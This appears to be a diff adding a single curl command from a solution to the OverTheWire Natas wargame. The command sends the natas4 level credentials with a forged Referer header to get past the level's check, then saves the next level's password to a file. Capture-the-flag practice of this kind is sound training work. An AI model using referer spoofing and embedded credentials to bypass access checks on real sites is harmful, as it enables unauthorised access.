@@ -1,0 +1,1 @@
+curl -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ -H 'Referer: http://natas5.natas.labs.overthewire.org/' http://natas4.natas.labs.overthewire.org/ | grep natas5 | cut -d ' ' -f 6,8 | tr ' ' ':' > ~/otw_labs/natas/passwds/5.txt
